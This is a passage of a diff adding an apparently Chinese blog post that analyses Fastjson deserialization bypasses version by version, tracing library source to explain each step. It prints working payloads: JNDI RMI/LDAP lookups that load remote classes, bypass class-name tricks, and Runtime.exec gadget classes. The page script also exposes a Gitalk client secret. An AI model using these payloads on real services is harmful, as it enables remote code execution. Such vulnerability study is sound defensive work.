+                    accept = this.acceptList[mask];
+                    if (className.startsWith(accept)) {
+                        if (clazz == null) {
+                            clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);
+                        }
+ 
+                        if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) {
+                            throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+                        }
+ 
+                        return clazz;
+                    }
+                }
+            }
+ 
+     //省略部分代码......
+    }
+}	
+</code></pre>
+<p>当autoTypeSupport 为 False 时，先黑名单过滤，然后再匹配白名单，如果白名单没匹配到则报错，所以必须配置有白名单，才能进行<code>loadClass</code>操作。</p>
+<p>当 autoTypeSupport 为 True 时，首先进行白名单过滤，如果在白名单上则直接<code>loadClass</code>，否则进行黑名单过滤。</p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/2485493-20210813151554625-396009731.png" alt="img" loading="lazy"></figure>
+<p>这里判断如果<code>className</code>是以<code>L</code>开头，并以<code>;</code>结尾，那么去除开头的<code>L</code>以及末尾的<code>;</code>，得到 newClassName 然后 loadClass，这样就绕过了CheckAutoType 的检查。</p>
+<p>所以当开启<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>时我们可以在<code>@type</code>处对指定类名进行改造，在JdbcRowSetImpl类的前面加了一个L，然后在TemplatesImpl类的后面再加一个<code>;</code>分号，就可以绕过了。</p>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220517214336927.png" alt="image-20220517214336927" loading="lazy"></figure>
+<h3 id="1242">1.2.42</h3>
+<p>1.2.42版本将黑名单denyList替换成了denyHashCodes，fastjson使用哈希黑名单来代替之前的明文黑名单来防止被绕过，增加了绕过的困难程度。<code>checkAutoType</code>函数会从<code>className</code>中将<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>类提取出来，然后把前后的字符<code>L</code>和<code>;</code>都去掉，然后再进行哈希黑名单过滤。</p>
+<pre><code class="language-java">public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) {
+    if (typeName == null) {
+        return null;
+    } else if (typeName.length() &lt; 128 &amp;&amp; typeName.length() &gt;= 3) {
+        String className = typeName.replace('$', '.');
+        Class&lt;?&gt; clazz = null;
+        long BASIC = -3750763034362895579L;
+        long PRIME = 1099511628211L;
+        if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {
+            className = className.substring(1, className.length() - 1);
+        }
+		
+		//计算className的哈希值
+        long h3 = (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L ^ (long)className.charAt(2)) * 1099511628211L;
+        long hash;
+        int i;
+        if (this.autoTypeSupport || expectClass != null) {
+            hash = h3;
+			
+            for(i = 3; i &lt; className.length(); ++i) {
+                hash ^= (long)className.charAt(i);
+                hash *= 1099511628211L;
+				//进行白名单过滤
+                if (Arrays.binarySearch(this.acceptHashCodes, hash) &gt;= 0) {
+                    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);
+                    if (clazz != null) {
+                        return clazz;
+                    }
+                }
+				//进行哈希黑名单过滤，如果匹配到则抛出异常
+                if (Arrays.binarySearch(this.denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) {
+                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+                }
+            }
+        }
+ 
+	//省略部分代码......
+	
+    } else {
+        throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+    }
+}
+</code></pre>
+<p>但是只提取了一次，所以我们可以通过双写绕过。</p>
+<pre><code class="language-java">LLcom.sun.rowset.JdbcRowSetImpl;;
+</code></pre>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220518091343620.png" alt="image-20220518091343620" loading="lazy"></figure>
+<h3 id="1243">1.2.43</h3>
+<p>1.2.43版本对1.2.42版本的绕过进行了修复，首先判断了className中的类是否以字符“L”开头，以字符“;”结尾，如果满足条件，继续判断是否以字符“LL”开头，如果满足条件则抛出异常。</p>
+<pre><code class="language-java">Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) {
+    if (typeName == null) {
+        return null;
+    } else if (typeName.length() &lt; 128 &amp;&amp; typeName.length() &gt;= 3) {
+        String className = typeName.replace('$', '.');
+        Class&lt;?&gt; clazz = null;
+        long BASIC = -3750763034362895579L;
+        long PRIME = 1099511628211L;
+        if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {
+            if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L == 655656408941810501L) {
+                throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+            }
+
+            className = className.substring(1, className.length() - 1);
+        }
+</code></pre>
+<p>因为1.2.42版本的payload已无法利用，因此我们需要另寻突破口，在TypeUtils类的<code>loadClass</code>方法中会对<code>className</code>进行校验</p>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220518100255292.png" alt="image-20220518100255292" loading="lazy"></figure>
+<p>这里<code>className</code>以<code>[</code>开头，然后通过<code>substring</code>去掉<code>[</code>，然后进行<code>loadClass</code></p>
+<p>那么可以对payload进行改造，在类前面加一个“[”字符，这样就可以绕过checkAutoType函数的过滤，如下所示：</p>
+<pre><code class="language-java">[com.sun.rowset.JdbcRowSetImpl
+</code></pre>
+<p>再次运行程序还是会报错，根据抛出的异常来看，是在调用DefaultJSONParser类的parseArray方法时抛出的异常</p>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220518102545227.png" alt="image-20220518102545227" loading="lazy"></figure>
+<p>打上断点调试，发现会判断token的值，如果不为14，则会抛出异常。</p>
+<figure data-type="image" tabindex="15"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220518185839142.png" alt="image-20220518185839142" loading="lazy"></figure>
+<p>这里调试可以发现我们的token是16，那么token是由什么决定的呢？在<code>[</code>的<code>if</code>处下个断点调试(有个坑点就是刚开始调试传入的className并不是我们的<code>JDBC</code>，而是<code>java.lang.AutoCloseable</code>，所以光标点到<code>if</code>判断里面，然后强行进入<code>if</code>语句里面)</p>
+<figure data-type="image" tabindex="16"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220518193841099.png" alt="image-20220518193841099" loading="lazy"></figure>
+<p>此时传入的类是<code>[com.sun.rowset.JdbcRowSetImpl</code>。来看一下<code>nextToken()</code>方法</p>
+<pre><code class="language-java">public final void nextToken() {
+    this.sp = 0;
+
+    while(true) {
+        while(true) {
+            this.pos = this.bp;
+            if (this.ch != '/') {
+                if (this.ch == '&quot;') {
+                    this.scanString();
+                    return;
+                }
+
+                if (this.ch == ',') {
+                    this.next();
+                    this.token = 16;
+                    return;
+                }
+
+                if (this.ch &gt;= '0' &amp;&amp; this.ch &lt;= '9') {
+                    this.scanNumber();
+                    return;
+                }
+
+                if (this.ch == '-') {
+                    this.scanNumber();
+                    return;
+                }
+                switch(this.ch) {
+                    case '\b':
+                    case '\t':
+                    case '\n':
+                    case '\f':
+                    case '\r':
+                    case ' ':
+                        this.next();
+                        break;
+                    case '\'':
+                        if (!this.isEnabled(Feature.AllowSingleQuotes)) {
+                            throw new JSONException(&quot;Feature.AllowSingleQuotes is false&quot;);
+                        }
+
+                        this.scanStringSingleQuote();
+                        return;
+                    case '(':
+                        this.next();
+                        this.token = 10;
+                        return;
+                    case ')':
+                        this.next();
+                        this.token = 11;
+                        return;
+                    case '+':
+                        this.next();
+                        this.scanNumber();
+                        return;
+                    case '.':
+                        this.next();
+                        this.token = 25;
+                        return;
+                    case ':':
+                        this.next();
+                        this.token = 17;
+                        return;
+                    case ';':
+                        this.next();
+                        this.token = 24;
+                        return;
+                    case 'N':
+                    case 'S':
+                    case 'T':
+                    case 'u':
+                        this.scanIdent();
+                        return;
+                    case '[':
+                        this.next();
+                        this.token = 14;
+                        return;
+                    case ']':
+                        this.next();
+                        this.token = 15;
+                        return;
+                    case 'f':
+                        this.scanFalse();
+                        return;
+                    case 'n':
+                        this.scanNullOrNew();
+                        return;
+                    case 't':
+                        this.scanTrue();
+                        return;
+                    case 'x':
+                        this.scanHex();
+                        return;
+                    case '{':
+                        this.next();
+                        this.token = 12;
+                        return;
+                    case '}':
+                        this.next();
+                        this.token = 13;
+                        return;
+</code></pre>
+<p><code>nextToken</code>方法会判断ch的值，然后根据ch的值设置token，在调试分析中ch的值是json数据中第一个逗号出现的位置（固定从这个位置取值），我们需要把token的值设置为14来绕过<code>DefaultJSONParser</code>类的<code>parseArray</code>方法。所以在第一个逗号出现的位置前面加<code>[</code></p>
+<figure data-type="image" tabindex="17"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220518201242230.png" alt="image-20220518201242230" loading="lazy"></figure>
+<figure data-type="image" tabindex="18"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220518201315160.png" alt="image-20220518201315160" loading="lazy"></figure>
+<p>此时的token就为14了，尝试打一下，发现有了新的异常。</p>
+<figure data-type="image" tabindex="19"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220518201516388.png" alt="image-20220518201516388" loading="lazy"></figure>
+<p>说是在43索引(第一个逗号)的位置还缺一个<code>{</code>，把<code>{</code>加上即可成功绕过</p>
+<p><strong>payload:</strong></p>
+<pre><code class="language-java">&quot;{\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[{,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;,\&quot;autoCommit\&quot;:true}&quot;
+</code></pre>
+<figure data-type="image" tabindex="20"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220518202109959.png" alt="image-20220518202109959" loading="lazy"></figure>
+<h3 id="1245">1.2.45</h3>
+<pre><code class="language-json">{
+    &quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,
+    &quot;properties&quot;:{
+        &quot;data_source&quot;:&quot;ldap://127.0.0.1:1389/Evil&quot;
+    }
+}
+</code></pre>
+<h3 id="1247">1.2.47</h3>
+<p>Fastjson从1.2.25开始，添加了配置项<code>setAutoTypeSupport</code>以及白名单，进一步限制@type的使用，默认该配置项关闭。如果配置项是关闭状态，那么只允许白名单内的类才能通过@type指定。</p>
+<p>此时com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesIpl和com.sun.rowset.JdbcRowSetIm都已经在黑名单中了，</p>
+<figure data-type="image" tabindex="21"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220517204511214.png" alt="image-20220517204511214" loading="lazy"></figure>
+<p>但是存在绕过方式，不需要setAutoTypeSupport为true。如果先传入如下JSON进行反序列化：</p>
+<pre><code class="language-json">{
+         &quot;@type&quot;: &quot;java.lang.Class&quot;,
+         &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;
+}
+</code></pre>
+<p>java.lang.Class是在白名单中的，反序列化后<code>com.sun.rowset.JdbcRowSetImpl</code>就会被加入到白名单中，剩下的就和1.2.24相同了，直接把两部分整合到一起：</p>
+<pre><code class="language-json">{
+         &quot;a&quot;: {
+                 &quot;@type&quot;: &quot;java.lang.Class&quot;,
+                 &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;
+         },
+         &quot;b&quot;: {
+                 &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+                 &quot;dataSourceName&quot;: &quot;rmi://127.0.0.1:1099/Exploit&quot;,
+                 &quot;autoCommit&quot;: true
+         }
+}
+</code></pre>
+<figure data-type="image" tabindex="22"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220517204821200.png" alt="image-20220517204821200" loading="lazy"></figure>
+<p>成功绕过！</p>
+<p>原理分析: <code>https://blog.csdn.net/qq_34101364/article/details/111706189</code> 之后来学！！！</p>
+<h3 id="1268">1.2.68</h3>
+<p>1.2.68这个版本加入了新的安全控制点<code>safeMode</code>，如果应用程序开启<code>safeMode</code>，将在<code>checkAutoType()</code>中直接抛出异常，完全禁止了<code>autoType</code>。</p>
+<figure data-type="image" tabindex="23"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/05/26/4257faef6c623.png" alt="1653549558525.png" loading="lazy"></figure>
+<p>但是这个版本爆出了可以通过<code>expectClass</code>绕过 <code>checkAutoType()</code></p>
+<figure data-type="image" tabindex="24"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/05/26/8de69681c78f3.png" alt="1653550793211.png" loading="lazy"></figure>
+<ul>
+<li>isAssignableFrom的作用</li>
+</ul>
+<p>有两个Class类型，一个是调用isAssignableFrom方法的类对象（也就是这里的expectClass），以及方法中作为参数的这个类对象（传入的类），这两个对象如果满足以下条件则返回true，否则返回false：</p>
+<ol>
+<li><code>expectClass</code>是<code>clazz</code>对象的父类或者是父接口</li>
+<li><code>expectClass</code>和clazz是同一个类或者同一个接口</li>
+</ol>
+<p>在<code>checkAutoType()</code>函数中，如果传入了<code>expectClass</code>，且传入的类的名字如果是<code>HashMap</code>或者是<code>expectClass</code>的子类或者实现就可以通过<code>checkAutoType()</code>的安全检测。</p>
+<p>现在看看哪些地方使用传入了<code>expectClass</code>这个参数</p>
+<figure data-type="image" tabindex="25"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/05/26/24158c05ca642.png" alt="1653553819286.png" loading="lazy"></figure>
+<p>发现主要是2个地方会使用到</p>
+<ul>
+<li>
+<p>com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze</p>
+</li>
+<li>
+<p>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze</p>
+</li>
+</ul>
+<p>先构造反序列化，也就是说如果我们@type的值对应的类构造的反序列化器是JavaBeanDeserializer或者ThrowableDeserializer，就会触发deserialze，同时有希望触发带有<code>expectClass</code>参数的checkAutoType达到我们的目的</p>
+<p>总结成一句话就是：寻找怎么才能调用到带有expectClass参数的checkAutoType方法</p>
+<figure data-type="image" tabindex="26"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/05/26/a9d8930050b5c.png" alt="1653554166730.png" loading="lazy"></figure>
+<p>如果clazz是Throwable的子类，那么就返回ThrowableDeserializer，如果所有条件都不满足，那么就会调用<code>createJavaBeanDeserializer</code>去新建<code>JavaBeanDeserializer</code></p>
+<h4 id="throwabledeserializer">ThrowableDeserializer</h4>
+<p>要使用到<code>com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer</code>这个反序列化器，根据上面的分析，那么我们<code>@type</code>传入的就应该是Throwable的子类或者本身。也就是说，我们的第二个<code>@type</code>对应的类必须是期望类<code>java.lang.Throwable</code>的子类</p>
+<p>这里第一个<code>@type</code>传入<code>Throwable</code>或者它的子类就可以使用<code>ThrowableDeserializer</code>，但是由于<code>java.lang.Throwable</code>不在白名单中，所以需要手动开启<code>autoTypeSupport</code></p>
+<figure data-type="image" tabindex="27"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/05/26/35b7745e007c3.png" alt="1653561163968.png" loading="lazy"></figure>
+<ul>
+<li>也就是说，第一个<code>@type</code>参数是<code>Throwable</code>或者它的子类，那么第二个<code>@type</code>如果也是<code>Throwable</code>或者它的子类，那么就可以绕过<code>checkAutoType()</code>，从而实例化第二个<code>@type</code>指向的类</li>
+</ul>
+<p>例如，我们本地编写一个<code>ThrowableEvil</code>，继承<code>Throwable</code>，然后静态代码块写入恶意代码，那么这里即可触发命令执行</p>
+<pre><code class="language-java">import java.lang.reflect.Method;
+
+public class ThrowableEvil extends Throwable{
+    static {
+        try {
+            Class runtime = Class.forName(&quot;java.lang.Runtime&quot;);
+            Method exec = runtime.getMethod(&quot;exec&quot;, String.class);
+            Method getRuntime = runtime.getMethod(&quot;getRuntime&quot;);
+            Object r = getRuntime.invoke(runtime);
+            exec.invoke(r, &quot;calc.exe&quot;);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="28"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/05/26/8cc62dd84a484.png" alt="1653561821863.png" loading="lazy"></figure>
+<p>这样就能成功利用了，但是实际上根本不存在这样的类去让我们创建，利用条件:</p>
+<ol>
+<li>限定了可以利用的类必须是Throwable的子类，不过异常类很少使用高危函数。</li>
+<li>需要开启ATS，更鸡肋了，随便找个不在黑名单的类都可以利用了</li>
+</ol>
+<p>所以说很难利用。</p>
+<h4 id="javabeandeserializer">JavaBeanDeserializer</h4>
+<p>在获取反序列化器的时候，如果是一个接口，且里面所有的判断都不满足，就会返回<code>JavaBeanDeserializer</code></p>
+<p>创建一个接口Test，并且写一个Test1实现这个接口，这个跟刚才那个差不多，也是第二个@type为第一个的实现，就能实例化第二个类</p>
+<figure data-type="image" tabindex="29"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/05/26/aeaf346d3bf1a.png" alt="1653563622202.png" loading="lazy"></figure>
+<p>这个类跟刚才那个不同的是，这个应用更广泛，<strong>只需要找一个接口，然后找一个实现了这个接口的类，类中有可以利用的点即可</strong>；最好是可以绕过autoTypeSupport。找到了java.lang.AutoCloseable这个接口，这个接口位于默认的mapping中，有很多子类，不开启autoTypeSupport也可以用。</p>
+<p>本地编写一个恶意类，实现<code>java.lang.AutoCloseable</code>接口</p>
+<p><strong>AutoCloseableEvil</strong></p>
+<pre><code class="language-java">import java.lang.reflect.Method;
+
+public class AutoCloseableEvil implements AutoCloseable{
+    static {
+        try {
+            Class runtime = Class.forName(&quot;java.lang.Runtime&quot;);
+            Method exec = runtime.getMethod(&quot;exec&quot;, String.class);
+            Method getRuntime = runtime.getMethod(&quot;getRuntime&quot;);
+            Object r = getRuntime.invoke(runtime);
+            exec.invoke(r, &quot;calc.exe&quot;);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+
+    @Override
+    public void close() throws Exception {
+
+    }
+}
+</code></pre>
+<p><strong>payload(未开启ATS)</strong></p>
+<pre><code class="language-json">{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;AutoCloseableEvil&quot;}
+</code></pre>
+<figure data-type="image" tabindex="30"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/05/26/5d0c238990777.png" alt="1653564195584.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="31"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/05/26/7a093667889c2.png" alt="1653564465701.png" loading="lazy"></figure>
+<p>虽然能利用了，但是这几行基本杜绝了JNDI注入的风险，只能另寻出路。</p>
+<p>在 Fastjson 1.2.68 版本上，由浅蓝师傅挖提出了使用 expectClass 中的 AutoCloseable 进行文件读写操作的思路：“IntputStream 和 OutputStream 都是实现自 AutoCloseable 接口的，而且也没有被列入黑名单，所以只要找到合适的类，还是可以进行文件读写等高危操作的。</p>
+<p>由此 fastjson 漏洞利用思路从命令执行、JNDI 转为了写文件，在实战情况下，还是可以写入 webshell 拿到权限，因此这个思路成为了 68 版本之后 fastjson 中挖掘漏洞的新思路。</p>
+<h2 id="总结">总结</h2>
+<p>其中<code>JSON.parse</code>和<code>JSON.parseObject()</code>的区别是:</p>
+<p>1、<code>JSON.parse()</code>返回的结果是<code>Object</code>对象，在使用<code>@type</code>指定类的时候，会获取<code>@type</code>指定的类并且调用该类的<code>setter</code>方法</p>
+<pre><code class="language-java">String jsonstr = &quot;{\&quot;@type\&quot;:\&quot;User\&quot;,\&quot;age\&quot;:20,\&quot;sex\&quot;:\&quot;男\&quot;,\&quot;userName\&quot;:\&quot;Le1a\&quot;}&quot;;
+Object user =  JSON.parse(jsonstr);//返回类型为Object
+</code></pre>
+<figure data-type="image" tabindex="32"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220517201729360.png" alt="image-20220517201729362" loading="lazy"></figure>
+<p>2、<code>JSON.parseObject()</code>返回的结果是<code>JSONObject</code>对象，在第二个参数中可以指定返回的对象类型，同时也会调用该类的setter方法</p>
+<pre><code class="language-java">String jsonstr = &quot;{\&quot;age\&quot;:20,\&quot;sex\&quot;:\&quot;男\&quot;,\&quot;userName\&quot;:\&quot;Le1a\&quot;}&quot;;
+User user = JSON.parseObject(jsonstr,User.class);//返回类型直接是User
+</code></pre>
+<figure data-type="image" tabindex="33"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220517202016651.png" alt="image-20220517202016651" loading="lazy"></figure>
+<p>3、<code>JSON.parseObject()</code>使用了<code>@type</code>获取指定类的时候，就会同时调用<code>getter</code>和<code>setter</code>方法。</p>
+<pre><code class="language-java">String jsonstr = &quot;{\&quot;@type\&quot;:\&quot;User\&quot;,\&quot;age\&quot;:20,\&quot;sex\&quot;:\&quot;男\&quot;,\&quot;userName\&quot;:\&quot;Le1a\&quot;}&quot;;
+JSONObject parse = JSON.parseObject(jsonstr);//返回类型为JSONObject
+</code></pre>
+<figure data-type="image" tabindex="34"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220517202637238.png" alt="image-20220517202637238" loading="lazy"></figure>
+<h2 id="参考">参考</h2>
+<p>https://blog.csdn.net/cdyunaq/article/details/123330514</p>
+<p>https://su18.org/post/fastjson/#8-fastjson-1268</p>
+<p>https://su18.org/post/fastjson-1.2.68/#%E5%89%8D%E8%A8%80</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E4%B8%80-%E4%BB%80%E4%B9%88%E6%98%AFfastjson">一、什么是fastjson?</a></li>
+<li><a href="#%E4%BA%8C-fastjson%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B">二、fastjson使用简介</a></li>
+<li><a href="#%E4%B8%89-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6">三、fastjson反序列化机制</a>
+<ul>
+<li><a href="#case1">Case1:</a></li>
+<li><a href="#case2">Case2:</a></li>
+<li><a href="#case3">Case3:</a></li>
+</ul>
+</li>
+<li><a href="#%E5%9B%9B-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">四、漏洞原理</a></li>
+<li><a href="#%E4%BA%94-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">五、漏洞利用</a>
+<ul>
+<li><a href="#1templatesimpl">1.TemplatesImpl</a>
+<ul>
+<li><a href="#exp">EXP</a></li>
+</ul>
+</li>
+<li><a href="#2jndi%E6%B3%A8%E5%85%A5">2.JNDI注入</a>
+<ul>
+<li><a href="#21rmi">2.1RMI</a>
+<ul>
+<li><a href="#%E5%B7%A5%E5%85%B7%E5%90%AF%E5%8A%A8rmi%E6%9C%8D%E5%8A%A1">工具启动RMI服务</a></li>
+<li><a href="#%E6%89%8B%E5%8A%A8%E5%90%AF%E5%8A%A8rmi%E6%9C%8D%E5%8A%A1">手动启动RMI服务</a></li>
+</ul>
+</li>
+<li><a href="#22ladp">2.2LADP</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E5%85%AD-fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87">六、Fastjson各版本绕过</a>
+<ul>
+<li><a href="#1224">1.2.24</a></li>
+<li><a href="#1225">1.2.25</a></li>
+<li><a href="#1242">1.2.42</a></li>
+<li><a href="#1243">1.2.43</a></li>
+<li><a href="#1245">1.2.45</a></li>
+<li><a href="#1247">1.2.47</a></li>
+<li><a href="#1268">1.2.68</a>
+<ul>
+<li><a href="#throwabledeserializer">ThrowableDeserializer</a></li>
+<li><a href="#javabeandeserializer">JavaBeanDeserializer</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/2020网鼎杯青龙组filejava/">
+              <h3 class="post-title">
+                2020网鼎杯青龙组filejava
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
